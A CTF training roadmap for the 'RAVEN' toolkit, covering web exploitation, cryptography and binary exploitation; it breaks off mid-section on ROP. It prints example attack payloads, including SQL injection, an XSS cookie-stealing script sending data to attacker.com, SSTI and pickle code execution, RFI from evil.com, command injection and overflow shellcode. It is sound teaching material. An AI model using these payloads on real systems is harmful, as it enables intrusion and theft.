# 🎯 CTF Competitor Learning Guide

> **Complete roadmap from beginner to advanced CTF competitor**  
> *Integrated with RAVEN CTF Toolkit for hands-on practice*

---

## 📖 How to Use This Guide

This guide is designed for **self-study** and **competition preparation**. Each section includes:
- ✅ **Core concepts** you need to master
- 🔧 **RAVEN commands** to practice with real tools
- 🎮 **Recommended platforms** for hands-on practice
- 📚 **Progression path** from beginner to advanced

**Study Strategy:**
1. Start with **Phase 1** if you're new to CTF
2. Practice each concept with provided RAVEN commands
3. Complete recommended challenges on practice platforms
4. Move to next phase when comfortable
5. **Don't rush** - mastery takes time!

---

## 🚀 Phase 1 — Getting Started

*Foundation skills needed for all CTF categories*

---

### 🖥️ 1.1 Linux & Command Line

**Why it matters:** 90% of CTF challenges require Linux command line proficiency

#### Core Skills:
- **Bash Basics:**
  - Navigation: `cd`, `pwd`, `ls`, `ls -la`
  - File operations: `cat`, `cp`, `mv`, `rm`, `mkdir`
  - Permissions: `chmod`, `chown`, `chgrp`
  - Process management: `ps`, `kill`, `top`, `htop`

- **File Manipulation:**
  - Viewing files: `cat`, `less`, `head`, `tail`
  - Searching: `find`, `locate`, `grep`
  - Text processing: `cut`, `sort`, `uniq`, `wc`

- **Piping & Redirection:**
  - Pipe: `|` (chain commands)
  - Redirect: `>`, `>>`, `<`
  - Example: `cat file.txt | grep "flag" > result.txt`

- **Essential Tools:**
  - `grep` - Search patterns in files
  - `awk` - Pattern scanning and processing
  - `sed` - Stream editor for text transformation
  - `strings` - Extract printable strings from binaries

#### 🔧 RAVEN Practice:
```bash
# Analyze multiple files in a challenge directory
raven --folder ./challenge/

# Quick analysis of unknown file type
raven unknown_file.dat --auto

# Extract strings from binary
strings binary.elf | grep -i "flag"
```

#### 🎮 Practice Platforms:
- **OverTheWire: Bandit** (Complete levels 0-15)
- **picoCTF: General Skills** (Beginner challenges)
- **CMD Challenge** (Online bash exercises)

#### ⏱️ Time Estimate: 1-2 weeks for basics

---

### 🐍 1.2 Python Scripting

**Why it matters:** Automation is key for solving challenges efficiently

#### Core Skills:
- **Python Basics:**
  - Variables, data types, operators
  - Control flow: `if`, `for`, `while`
  - Functions and modules
  - File I/O operations

- **Automation Scripting:**
  - Reading/writing files
  - Network requests with `requests` library
  - Socket programming for network tools
  - Regular expressions with `re` module

- **CTF-Specific Libraries:**
  - **pwntools:** Binary exploitation framework
    ```python
    from pwn import *
    p = remote('challenge.ctf.com', 1337)
    p.recvuntil('input: ')
    p.sendline(payload)
    print(p.recvall())
    ```
  - **requests:** HTTP interactions
    ```python
    import requests
    r = requests.get('http://challenge.com/login')
    r.post('http://challenge.com/login', data={'user': 'admin', 'pass': 'test'})
    ```
  - **BeautifulSoup:** HTML parsing
  - **hashlib:** Hash calculations

#### 🔧 RAVEN Integration:
- Study RAVEN's Python engine architecture
- Learn from existing automation patterns
- Create custom scripts for specific challenges

#### 🎮 Practice Platforms:
- **Python Challenge** (riddles requiring Python)
- **CryptoHack** (Python-based crypto challenges)
- **Exploit Education** (Binary exploitation with Python)

#### ⏱️ Time Estimate: 2-3 weeks for proficiency

---

### 🔢 1.3 Number Systems & Encoding

**Why it matters:** Data representation is fundamental to cryptography and encoding challenges

#### Core Skills:
- **Number Systems:**
  - **Binary (Base-2):** `01001000` = 72 = 'H'
  - **Octal (Base-8):** `0o110` = 72
  - **Decimal (Base-10):** `72`
  - **Hexadecimal (Base-16):** `0x48` = 72

- **Encoding Schemes:**
  - **Base64:** `SGVsbG8=` = "Hello"
  - **URL Encoding:** `%48%65%6C%6C%6F` = "Hello"
  - **HTML Entities:** `&#72;&#101;&#108;&#108;&#111;`
  - **ASCII Table:** A=65, a=97, 0=48

- **Conversion Practice:**
  ```bash
  # Python conversions
  python3 -c "print(bin(72))"          # Decimal to binary
  python3 -c "print(hex(72))"          # Decimal to hex
  python3 -c "print(chr(72))"          # Decimal to ASCII
  python3 -c "print(ord('H'))"         # ASCII to decimal
  ```

#### 🔧 RAVEN Commands:
```bash
# Binary digits analysis (file with 0s and 1s)
raven binary.txt --binary

# Binary to image rendering
raven binary.txt --binary --bin-width 64

# Morse code decoding
raven morse.txt --morse

# Decimal ASCII conversion
raven decimal.txt --decimal

# Multi-stage encoding/decoding
raven encoded.txt --encoding-chain
```

#### 🎮 Practice Platforms:
- **picoCTF: Cryptography** (Encoding challenges)
- **CyberChef** (Online encoding/decoding tool)
- **dCode.fr** (Various cipher tools)

#### ⏱️ Time Estimate: 1 week

---

### 🌐 1.4 Basic Networking

**Why it matters:** Network forensics and web challenges require protocol understanding

#### Core Skills:
- **TCP/IP Model:**
  - Layer 1: Physical (cables, signals)
  - Layer 2: Data Link (MAC addresses, switches)
  - Layer 3: Network (IP addresses, routing)
  - Layer 4: Transport (TCP/UDP, ports)
  - Layer 5-7: Application (HTTP, DNS, FTP, SSH)

- **Key Protocols:**
  - **HTTP/HTTPS:** Request methods (GET, POST), status codes (200, 404, 500)
  - **DNS:** Domain resolution, record types (A, AAAA, MX, TXT, CNAME)
  - **TCP:** Three-way handshake (SYN, SYN-ACK, ACK)
  - **UDP:** Connectionless, faster but unreliable
  - **FTP:** File transfer (control port 21, data port 20)
  - **SSH:** Secure shell (port 22)
  - **SMTP/POP3/IMAP:** Email protocols

- **Network Tools:**
  - `ping` - Test connectivity
  - `traceroute` - Path to destination
  - `netstat` - Network statistics
  - `nmap` - Port scanning
  - `tcpdump` - Packet capture
  - **Wireshark** - Packet analysis GUI

#### 🔧 RAVEN Commands:
```bash
# Full PCAP analysis
raven capture.pcap --pcap

# DNS tunneling detection
raven capture.pcap --dns-tunnel

# FTP session reconstruction
raven capture.pcap --ftp-recon

# Email session reconstruction
raven capture.pcap --email-recon

# Deep packet inspection
raven capture.pcap --pcap-deep
```

#### 🎮 Practice Platforms:
- **Wireshark 101** (Official tutorials)
- **MalwareTrafficAnalysis.net** (PCAP challenges)
- **picoCTF: Forensics** (Network challenges)

#### ⏱️ Time Estimate: 2 weeks

---

### 🎮 1.5 CTF Platforms & Format

**Why it matters:** Understanding competition structure improves performance

#### CTF Types:
- **Jeopardy-Style:**
  - Categories: Web, Crypto, Pwn, Reverse, Forensics, Misc
  - Point-based: Easy (100pts) → Hard (500pts)
  - Flag format: `flag{...}`, `CTF{...}`, `picoCTF{...}`
  - **Examples:** picoCTF, DEF CON CTF Quals, CSAW

- **Attack-Defense:**
  - Teams defend own server while attacking others
  - Real-time scoring
  - Patch vulnerabilities quickly
  - **Examples:** DEF CON CTF Finals, RuCTF

- **King of the Hill (KoTH):**
  - Control servers/infrastructure
  - Maintain access while denying others
  - **Examples:** National Cyber League

#### Team Dynamics:
- **Team Size:** 2-5 members (typical)
- **Roles:**
  - Web Exploitation Specialist
  - Cryptography Expert
  - Binary Exploitation (Pwn)
  - Reverse Engineering
  - Forensics & OSINT
- **Communication:** Discord/Slack for coordination
- **Time Management:** Prioritize by points/difficulty

#### Flag Submission:
- **Format Examples:**
  - `flag{this_is_a_flag}`
  - `picoCTF{example_flag}`
  - `CTF{flag_content}`
  - `LKS{indonesia_flag}`
- **Common Issues:**
  - Case sensitivity (usually lowercase)
  - Whitespace matters
  - Special characters must match exactly

#### 🔧 RAVEN Usage:
```bash
# Custom flag format detection
raven -f "LKS{" challenge_file.txt --auto

# Batch analyze multiple files
raven *.png *.jpg *.txt --auto

# Quick mode for time-sensitive competitions
raven challenge.png --quick
```

#### 🎮 Recommended First CTFs:
1. **picoCTF** (Beginner-friendly, year-round)
2. **CryptoHack** (Cryptography focused)
3. **OverTheWire** (Wargames for learning)
4. **CTFlearn** (Community challenges)

#### ⏱️ Time Estimate: 1 week to understand

---

## 🌐 Phase 2 — Web Exploitation

*Most popular CTF category - find and exploit web vulnerabilities*

---

### 💉 2.1 SQL Injection (SQLi)

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common in CTFs)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### Types of SQLi:
- **Union-Based:**
  ```sql
  ' UNION SELECT username, password FROM users--
  ```
  - Combines results from multiple SELECT statements
  - Requires knowing number of columns

- **Blind SQLi:**
  ```sql
  ' AND 1=1--   (True condition)
  ' AND 1=2--   (False condition)
  ```
  - No direct output, infer from behavior
  - Time-based: `WAITFOR DELAY '0:0:5'`
  - Boolean-based: Different responses for true/false

- **Error-Based:**
  ```sql
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
  ```
  - Forces database to show error messages
  - Extracts data through error output

- **Filter Evasion:**
  - Bypass quotes: `CHAR(97,100,109,105,110)` instead of `'admin'`
  - Bypass spaces: `%20`, `/**/`, `+`
  - Bypass keywords: `UN/**/ION`, `union`

- **NoSQL Injection:**
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  ```
  - MongoDB, CouchDB exploitation
  - Different syntax, same concept

#### Tools:
- **sqlmap:** Automated SQL injection
  ```bash
  sqlmap -u "http://target.com/page?id=1" --dbs
  sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
  ```
- **Burp Suite:** Web proxy for testing
- **Manual Testing:** Always try manual injection first!

#### 🔧 RAVEN Commands:
```bash
# Analyze web server logs for SQLi attempts
raven access.log --log

# Look for suspicious patterns
grep -i "union\|select\|insert\|update\|delete" access.log
```

#### 🎮 Practice Platforms:
- **SQLi Labs** (GitHub: Audi-1/sqli-labs)
- **PortSwigger Web Security Academy** (Free)
- **DVWA** (Damn Vulnerable Web App)
- **picoCTF: Web Exploitation**

#### 🏆 CTF Strategy:
1. Test all input fields with `'` and `"`
2. Check for error messages
3. Determine number of columns with `ORDER BY`
4. Extract database structure
5. Dump credentials/flags

#### ⏱️ Time to Mastery: 2-3 weeks

---

### ⚡ 2.2 Cross-Site Scripting (XSS)

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### Types of XSS:
- **Reflected XSS:**
  - Payload reflected in response immediately
  ```html
  <script>alert('XSS')</script>
  ```
  - Delivered via URL parameters

- **Stored XSS:**
  - Payload stored in database
  - Executes when other users view the page
  - More dangerous, persistent

- **DOM-Based XSS:**
  - Vulnerability in client-side JavaScript
  - Doesn't require server interaction
  ```javascript
  document.write(location.hash.substring(1))
  ```

#### Advanced Techniques:
- **Cookie Stealing:**
  ```javascript
  <script>
    document.location='http://attacker.com/?cookie='+document.cookie
  </script>
  ```

- **CSP Bypass:**
  - Content Security Policy restrictions
  - Use allowed sources
  - JSONP endpoints

- **Polyglots:**
  - Payloads that work in multiple contexts
  ```
  javascript://%250Aalert(1)//"/*\'/*`/*--></title></textarea></style></noscript></script></html>
  ```

#### 🔧 Testing Methodology:
1. Identify input points
2. Test basic payload: `<script>alert(1)</script>`
3. Check if HTML is rendered
4. Try event handlers: `<img src=x onerror=alert(1)>`
5. Bypass filters (case changes, encoding)

#### 🎮 Practice Platforms:
- **XSS-Game** (xss-game.appspot.com)
- **PortSwigger XSS Challenges**
- **Alert(1) to Win** (alf.nu/alert1)
- **picoCTF: Web Exploitation**

#### 🏆 CTF Strategy:
1. Find all user inputs
2. Test if HTML/JS is reflected
3. Check if it's stored or reflected
4. Craft payload for flag extraction
5. Bypass filters with encoding/obfuscation

#### ⏱️ Time to Mastery: 2 weeks

---

### 🖥️ 2.3 Server-Side Vulnerabilities

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### Server-Side Template Injection (SSTI):
- **Concept:** Inject code in template engines
- **Common Engines:** Jinja2 (Python), Twig (PHP), EJS (Node.js)
- **Payload Examples:**
  ```python
  # Jinja2
  {{7*7}}           # Test: returns 49
  {{config}}        # Dump configuration
  {{''.__class__.__mro__[2].__subclasses__()}}  # List classes
  {{cycler.__init__.__globals__.os.popen('id').read()}}  # RCE
  ```

#### Server-Side Request Forgery (SSRF):
- **Concept:** Make server make requests on your behalf
- **Targets:**
  - Internal services: `http://localhost:8080`
  - Cloud metadata: `http://169.254.169.254/latest/meta-data/`
  - File access: `file:///etc/passwd`
- **Bypasses:**
  - URL encoding
  - DNS rebinding
  - IPv6: `http://[::1]:80`

#### Local/Remote File Inclusion (LFI/RFI):
- **LFI:** Include local files
  ```
  http://target.com/page.php?file=../../../etc/passwd
  ```
- **RFI:** Include remote files
  ```
  http://target.com/page.php?file=http://evil.com/shell.php
  ```
- **Path Traversal:**
  - `../../etc/passwd`
  - `....//....//....//etc/passwd` (bypass filter)
  - `..%2f..%2f..%2fetc%2fpasswd` (URL encoded)

#### Command Injection:
- **Basic:**
  ```
  ; ls -la
  | cat /etc/passwd
  && whoami
  `id`
  $(whoami)
  ```
- **Bypass Filters:**
  - Spaces: `${IFS}`, `$IFS$9`, `%20`
  - Commands: `c\at`, `c""at`, `$(printf 'cat')`
  - Encoding: URL encoding, double encoding

#### 🔧 RAVEN Commands:
```bash
# Analyze logs for injection attempts
raven access.log --log

# Check for encoded payloads
raven suspicious.txt --deobfuscate
```

#### 🎮 Practice Platforms:
- **PortSwigger Web Security Academy**
- **HackTheBox: Web Challenges**
- **PentesterLab**
- **picoCTF**

#### 🏆 CTF Strategy:
1. Identify technology stack
2. Test all parameters for injection
3. Look for error messages
4. Try common payloads
5. Escalate to RCE if possible

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🔐 2.4 Authentication Attacks

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### Session Fixation:
- Set user's session ID before they login
- Session doesn't change after authentication
- **Test:** Login with custom session cookie

#### JWT (JSON Web Token) Attacks:
- **Structure:** `header.payload.signature`
- **Common Attacks:**
  1. **None Algorithm:**
     ```json
     {"alg": "none", "typ": "JWT"}
     ```
  2. **Algorithm Confusion:** RS256 → HS256
  3. **Weak Secret:** Brute-force with hashcat
     ```bash
     hashcat -m 16500 jwt.txt wordlist.txt
     ```
  4. **Claim Manipulation:** Change `role`, `user_id`

#### Cookie Manipulation:
- Decode cookie: `base64`, `hex`, `JSON`
- Modify values: `admin=false` → `admin=true`
- Re-encode and test

#### Brute Force:
- **Tools:** hydra, burp intruder, custom scripts
  ```bash
  hydra -l admin -P wordlist.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
  ```
- **Bypasses:**
  - Rate limiting: IP rotation, delays
  - Account lockout: Case variations
  - CAPTCHA: Reuse, OCR

#### 🔧 RAVEN Commands:
```bash
# Crack password protected files
raven protected.zip --zipcrack
raven hash.txt --john
raven hash.txt --hashcat

# Analyze authentication logs
raven auth.log --log
```

#### 🎮 Practice Platforms:
- **PortSwigger Authentication Challenges**
- **JWT.io Debugger**
- **OWASP Juice Shop**
- **picoCTF**

#### 🏆 CTF Strategy:
1. Analyze authentication mechanism
2. Check for weak configurations
3. Test token/cookie manipulation
4. Attempt brute force if needed
5. Look for logic flaws

#### ⏱️ Time to Mastery: 2 weeks

---

### 🧠 2.5 Deserialization & Advanced

**Prevalence:** ⭐⭐⭐ (Intermediate/Advanced)  
**Difficulty:** ⭐⭐⭐⭐ (Hard)

#### PHP Deserialization:
- **Magic Methods:** `__wakeup()`, `__destruct()`, `__toString()`
- **Payload Generation:**
  ```php
  <?php
  class Evil {
    public $cmd = "id";
  }
  echo serialize(new Evil());
  ?>
  ```

#### Python Deserialization:
- **Pickle Exploitation:**
  ```python
  import pickle
  import base64
  import os

  class RCE:
      def __reduce__(self):
          return (os.system, ("id",))

  print(base64.b64encode(pickle.dumps(RCE())))
  ```

#### Java Deserialization:
- **ysoserial tool:**
  ```bash
  java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser
  ```

#### Prototype Pollution (JavaScript):
- Modify object prototypes
- Affects all objects of same type
- **Example:**
  ```javascript
  JSON.parse('{"__proto__": {"isAdmin": true}}')
  ```

#### Race Conditions:
- Time-of-check to time-of-use (TOCTOU)
- **Testing:**
  - Concurrent requests
  - Tools: Turbo Intruder (Burp)
  ```python
  import threading
  import requests

  def send_request():
      requests.post('http://target.com/use_coupon', data={'code': 'DISCOUNT50'})

  threads = [threading.Thread(target=send_request) for _ in range(10)]
  for t in threads: t.start()
  ```

#### 🎮 Practice Platforms:
- **PortSwigger Deserialization Challenges**
- **Jackson Deserialization Exploits**
- **HackTheBox Advanced**

#### 🏆 CTF Strategy:
1. Identify serialization format
2. Find object injection point
3. Craft malicious payload
4. Trigger deserialization
5. Achieve code execution

#### ⏱️ Time to Mastery: 4-6 weeks

---

## 🔐 Phase 3 — Cryptography

*Break encryption and crack hashes*

---

### 🏛️ 3.1 Classical Ciphers

**Prevalence:** ⭐⭐⭐⭐ (Common in beginner CTFs)  
**Difficulty:** ⭐⭐☆ (Beginner)

#### Caesar Cipher:
- Shift alphabet by N positions
- **Brute Force:** Only 25 possible shifts
- **Example:** `ABC` shift 3 → `DEF`
- **RAVEN:** `raven cipher.txt --classic`

#### Vigenère Cipher:
- Multiple Caesar ciphers with keyword
- **Breaking:**
  1. Find key length (Kasiski examination)
  2. Frequency analysis per position
  3. Recover key
- **RAVEN:** `raven cipher.txt --crypto --vigenere`

#### Substitution Cipher:
- Replace each letter with another
- **Breaking:** Frequency analysis
  - English: E=12.7%, T=9.1%, A=8.2%
  - Look for common patterns: THE, AND, ING
- **RAVEN:** `raven cipher.txt --crypto` (auto-detection)

#### Transposition Cipher:
- Rearrange letter positions
- **Types:** Rail Fence, Columnar, Route
- **Breaking:** Anagram solving, pattern recognition

#### Frequency Analysis:
```python
from collections import Counter

text = "encrypted text here"
freq = Counter(text)
print(freq.most_common())
```

#### 🔧 RAVEN Commands:
```bash
# Classic cipher brute force
raven cipher.txt --classic

# Vigenere with auto key detection
raven cipher.txt --crypto --vigenere

# Full crypto analysis
raven cipher.txt --crypto
```

#### 🎮 Practice Platforms:
- **CryptoHack: Classical**
- **dCode.fr**
- **picoCTF: Cryptography**
- **Cryptool Online**

#### 🏆 CTF Strategy:
1. Identify cipher type (look for patterns)
2. Check if spaces preserved (classical vs modern)
3. Try frequency analysis
4. Brute force short keys
5. Use RAVEN auto-detection

#### ⏱️ Time to Mastery: 1-2 weeks

---

### 🔑 3.2 Modern Symmetric Crypto

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### AES Modes:
- **ECB (Electronic Codebook):**
  - Each block encrypted independently
  - **Weakness:** Identical plaintext → identical ciphertext
  - **Attack:** "ECB Penguin" - patterns visible in encrypted images
  
- **CBC (Cipher Block Chaining):**
  - Each block XORed with previous ciphertext
  - **IV (Initialization Vector)** needed for first block
  - **Attack:** Padding Oracle

- **CTR (Counter):**
  - Turns block cipher into stream cipher
  - **Weakness:** Nonce reuse = keystream reuse

#### Block Cipher Attacks:
- **ECB Pattern Detection:**
  - Look for repeating blocks
  - Indicates ECB mode
  
- **Padding Oracle:**
  ```python
  # Decrypt byte-by-byte
  for byte_pos in range(16):
      for guess in range(256):
          # Modify padding, check response
          if valid_padding(guess):
              decrypted_byte = guess
              break
  ```

- **Bit Flipping (CBC):**
  - Modify ciphertext to change plaintext
  - Useful for changing specific values

#### DES Weaknesses:
- **Small key size:** 56 bits (brute-forceable)
- **Weak keys:** 4 weak, 12 semi-weak
- **Triple DES:** More secure but slow

#### 🔧 RAVEN Commands:
```bash
# Analyze encrypted files
raven encrypted.bin --crypto

# Decrypt with known key
raven encrypted.txt --xor-key "SECRET"
```

#### 🎮 Practice Platforms:
- **CryptoHack: Symmetric Ciphers**
- **Padding Oracle Challenges**
- **Cryptopals Set 2-3**

#### 🏆 CTF Strategy:
1. Identify encryption mode (ECB/CBC/CTR)
2. Check for patterns (ECB weakness)
3. Look for IV/nonce issues
4. Try padding oracle if applicable
5. Attempt bit flipping for specific changes

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🔓 3.3 Asymmetric Cryptography (RSA)

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common)  
**Difficulty:** ⭐⭐⭐⭐ (Intermediate to Hard)

#### RSA Basics:
- **Public Key:** (n, e)
- **Private Key:** (n, d)
- **Encryption:** c = m^e mod n
- **Decryption:** m = c^d mod n
- **n = p × q** (product of two primes)

#### Common Attacks:

**1. Small Exponent (e=3):**
- **When:** e is very small (3, 5, 7)
- **Attack:** If m^e < n, then c = m^e (no modulo)
- **Solution:** m = c^(1/e) (eth root)
```python
from sympy import integer_nthroot

m = integer_nthroot(c, 3)[0]  # For e=3
print(bytes.fromhex(hex(m)[2:]))
```
- **RAVEN:** Auto-detected with `--crypto`

**2. Wiener's Attack:**
- **When:** Private exponent d is small
- **Condition:** d < n^0.25 / 3
- **Uses:** Continued fractions

**3. Hastad's Broadcast Attack:**
- **When:** Same message encrypted with different N, small e
- **Requires:** e ciphertexts with same e
- **Solution:** Chinese Remainder Theorem

**4. Common Modulus:**
- **When:** Same n, different e1, e2
- **Condition:** gcd(e1, e2) = 1
- **Attack:** Extended Euclidean Algorithm

**5. Fermat Factorization:**
- **When:** p and q are close
- **Works:** n = p × q, |p-q| is small
```python
import math

def fermat(n):
    a = math.isqrt(n) + 1
    b2 = a*a - n
    while not is_square(b2):
        a += 1
        b2 = a*a - n
    p = a - math.isqrt(b2)
    q = a + math.isqrt(b2)
    return p, q
```

**6. Weak Primes:**
- **When:** p or q has known patterns
- **Check:** FactorDB for known factorizations

#### 🔧 RAVEN Commands:
```bash
# Full RSA analysis (auto-detects attack type)
raven rsa_challenge.txt --crypto

# Focus on RSA attacks
raven rsa_challenge.txt --crypto --rsa

# Manual XOR with known plaintext
raven encrypted.bin --xor-plain "CTF{"
```

#### 🎮 Practice Platforms:
- **CryptoHack: RSA**
- **RsaCtfTool** (Automated attacks)
- **FactorDB** (Check if N is factored)
- **picoCTF: Cryptography**

#### 🏆 CTF Strategy:
1. Extract n, e, c from challenge
2. Check e size (small exponent?)
3. Check if p, q given or derivable
4. Try FactorDB for n factorization
5. Apply appropriate attack
6. Use RAVEN `--crypto` for auto-detection

#### ⏱️ Time to Mastery: 4-6 weeks

---

### #️⃣ 3.4 Hashing

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common)  
**Difficulty:** ⭐⭐☆ (Beginner to Intermediate)

#### Hash Functions:
- **MD5:** 128-bit, broken (collisions found)
- **SHA-1:** 160-bit, broken (SHAttered attack)
- **SHA-256:** 256-bit, secure
- **SHA-512:** 512-bit, secure
- **bcrypt:** Password hashing (slow by design)

#### Common Attacks:

**1. Brute Force:**
```bash
# John the Ripper
raven hash.txt --john

# Hashcat
raven hash.txt --hashcat
raven hash.txt --hashcat --hash-type sha256
```

**2. Rainbow Tables:**
- Pre-computed hash tables
- **Tools:** rainbowcrack, online databases
- **Defense:** Salted hashes

**3. Length Extension Attack:**
- **Applies to:** MD5, SHA-1, SHA-256
- **Condition:** hash(secret || message)
- **Goal:** hash(secret || message || padding || extension)
- **Tools:** `hash_extender`
```bash
hash_extender -d "original_data" -s "hash" -a "extension" -f sha256 -l 16
```

**4. MD5 Collisions:**
- Two different inputs → same hash
- **Tools:** `fastcoll`
- **Use:** Bypass integrity checks

#### Hash Identification:
```bash
# Identify hash type
hashid hash.txt

# Common patterns:
# MD5: 32 hex chars
# SHA-1: 40 hex chars
# SHA-256: 64 hex chars
# bcrypt: $2a$12$...
```

#### 🔧 RAVEN Commands:
```bash
# Crack with John the Ripper
raven hash.txt --john

# Crack with Hashcat
raven hash.txt --hashcat

# Specify hash type
raven hash.txt --john --hash-type md5
```

#### 🎮 Practice Platforms:
- **CrackStation** (Online hash cracking)
- **Hashes.org** (Pre-cracked hashes)
- **CryptoHack: Hashes**
- **picoCTF**

#### 🏆 CTF Strategy:
1. Identify hash type (length, format)
2. Try online databases first
3. Use RAVEN with appropriate wordlist
4. Try length extension if applicable
5. Look for weak implementations

#### ⏱️ Time to Mastery: 2-3 weeks

---

### ⚠️ 3.5 Crypto Implementation Flaws

**Prevalence:** ⭐⭐⭐ (Intermediate)  
**Difficulty:** ⭐⭐⭐⭐ (Hard)

#### Weak RNG:
- **Problem:** Predictable "random" values
- **Examples:**
  - Python `random` (Mersenne Twister - predictable)
  - Time-based seeds
  - Weak `/dev/random` implementations
- **Attack:** Predict next value

#### Timing Attacks:
- **Concept:** Measure execution time to infer secrets
- **Example:** String comparison leaks length
```python
# Vulnerable
def check_password(pwd):
    return pwd == stored_password  # Returns early on mismatch

# Secure
def check_password(pwd):
    return hmac.compare_digest(pwd, stored_password)  # Constant time
```

#### Reused Nonces:
- **ECDSA Nonce Reuse:** Recover private key
- **AES-CTR Nonce Reuse:** XOR ciphertexts
```python
# If same nonce used:
c1 = m1 ⊕ keystream
c2 = m2 ⊕ keystream
c1 ⊕ c2 = m1 ⊕ m2  # XOR of plaintexts!
```

#### Custom Crypto:
- **Red Flag:** "Rolling own crypto"
- **Look for:**
  - XOR with repeating key
  - Custom substitution/permutation
  - Weak key derivation
- **Attack:** Analyze algorithm for weaknesses

#### 🔧 RAVEN Commands:
```bash
# XOR with known plaintext
raven encrypted.bin --xor-plain "CTF{"

# XOR with known key
raven encrypted.bin --xor-key "SECRETKEY"

# Full crypto analysis
raven challenge.txt --crypto
```

#### 🎮 Practice Platforms:
- **CryptoHack: Challenges**
- **Cryptopals** (Industry standard)
- **HackTheBox Crypto**

#### 🏆 CTF Strategy:
1. Identify algorithm/mode
2. Check for standard implementations
3. Look for custom/modified crypto
4. Analyze for known weaknesses
5. Exploit implementation flaws

#### ⏱️ Time to Mastery: 4-6 weeks

---

## 💣 Phase 4 — Binary Exploitation (Pwn)

*Exploit programs to gain code execution*

---

### ⚙️ 4.1 x86/x64 Assembly

**Why it matters:** Understanding binaries is essential for exploitation

#### x86 Registers:
- **General Purpose:**
  - EAX/RAX: Accumulator (return values)
  - EBX/RBX: Base
  - ECX/RCX: Counter
  - EDX/RDX: Data
  - ESI/RSI: Source index
  - EDI/RDI: Destination index
  - EBP/RBP: Base pointer (stack frame)
  - ESP/RSP: Stack pointer

- **Special Registers:**
  - EIP/RIP: Instruction pointer (next instruction)
  - EFLAGS/RFLAGS: Status flags

#### Common Instructions:
```assembly
; Data movement
MOV eax, ebx        ; eax = ebx
PUSH eax            ; Push eax to stack
POP ebx             ; Pop from stack to ebx

; Arithmetic
ADD eax, 5          ; eax += 5
SUB eax, ebx        ; eax -= ebx
INC eax             ; eax++
DEC eax             ; eax--

; Comparison & Branch
CMP eax, ebx        ; Compare eax and ebx
JE label            ; Jump if equal
JNE label           ; Jump if not equal
JG label            ; Jump if greater
JL label            ; Jump if less

; Function calls
CALL function       ; Call function
RET                 ; Return from function
```

#### Calling Conventions:
- **x86 (32-bit):**
  - Arguments: Stack (right to left)
  - Return: EAX
  
- **x64 (64-bit) - System V AMD64:**
  - Arguments: RDI, RSI, RDX, RCX, R8, R9
  - Return: RAX
  - Stack must be 16-byte aligned before CALL

#### Stack Frames:
```
High Addresses
┌─────────────────────┐
│   Arguments         │
├─────────────────────┤
│   Return Address    │ ← Saved EIP/RIP
├─────────────────────┤
│   Saved EBP/RBP     │ ← Previous frame pointer
├─────────────────────┤
│   Local Variables   │
├─────────────────────┤
│   Saved Registers   │
└─────────────────────┘
Stack Pointer (ESP/RSP) → Bottom
Low Addresses
```

#### 🔧 RAVEN Commands:
```bash
# Basic reversing analysis
raven binary.elf --reversing

# Full Ghidra analysis
raven binary.elf --reversing --ghidra

# Extract strings
strings binary.elf | grep -i "flag\|password\|success"
```

#### 🎮 Practice Platforms:
- **picoCTF: Binary Exploitation**
- **Exploit Education** (Phoenix, Nebula)
- **ROP Emporium** (Learn ROP)
- **HackTheBox: Pwn**

#### ⏱️ Time to Mastery: 2-3 weeks

---

### 💥 4.2 Buffer Overflow

**Prevalence:** ⭐⭐⭐⭐⭐ (Very common in pwn)  
**Difficulty:** ⭐⭐⭐ (Intermediate)

#### Concept:
- Write more data than buffer can hold
- Overflow into adjacent memory
- Overwrite return address → control execution

#### Stack-Based Overflow:
```c
void vuln() {
    char buffer[64];
    gets(buffer);  // VULNERABLE - no bounds checking!
}
```

#### Exploitation Steps:

**1. Find Offset:**
```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(100)

# Run program with pattern
p = process('./binary')
p.sendline(pattern)
p.wait()

# Check crash - find overwritten value
# Use it to calculate offset
```

**2. Overwrite Return Address:**
```python
offset = 72
ret_address = 0x401234  # Address of win() function

payload = b'A' * offset
payload += p64(ret_address)

p.sendline(payload)
```

**3. Execute Shellcode:**
```python
from pwn import shellcraft, asm

# Generate shellcode
shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(ret_address)  # Point to shellcode
```

#### NOP Sled:
- NOP = No Operation (0x90)
- Increases chance of hitting shellcode
```python
payload = b'\x90' * 100  # NOP sled
payload += shellcode
payload += b'A' * (offset - len(payload))
payload += p64(ret_address)
```

#### 🔧 RAVEN Commands:
```bash
# Analyze binary for vulnerabilities
raven binary.elf --reversing

# Check for packers
raven packed.exe --reversing --unpack
```

#### 🎮 Practice Platforms:
- **picoCTF: Buffer Overflow series**
- **Exploit Education: Phoenix**
- **Protostar** (Classic challenges)
- **ROP Emporium**

#### 🏆 CTF Strategy:
1. Find vulnerable function (gets, strcpy, sprintf)
2. Determine buffer size and offset
3. Find useful functions/addresses
4. Craft payload
5. Handle protections (ASLR, NX, canaries)

#### ⏱️ Time to Mastery: 3-4 weeks

---

### 🔗 4.3 Return Oriented Programming (ROP)

**Prevalence:** ⭐⭐⭐⭐ (Common)  
**Difficulty:** ⭐⭐⭐⭐ (Hard)

#### Concept:
- Can't execute own code (NX bit)
- Use existing code snippets (gadgets)
- Chain gadgets to achieve goal
- Each gadget ends with `RET`

#### Finding Gadgets:
```bash
# ROPgadget
ROPgadget --binary binary --only "pop|ret"

# ropper
ropper --file binary --search "pop rdi"

# radare2
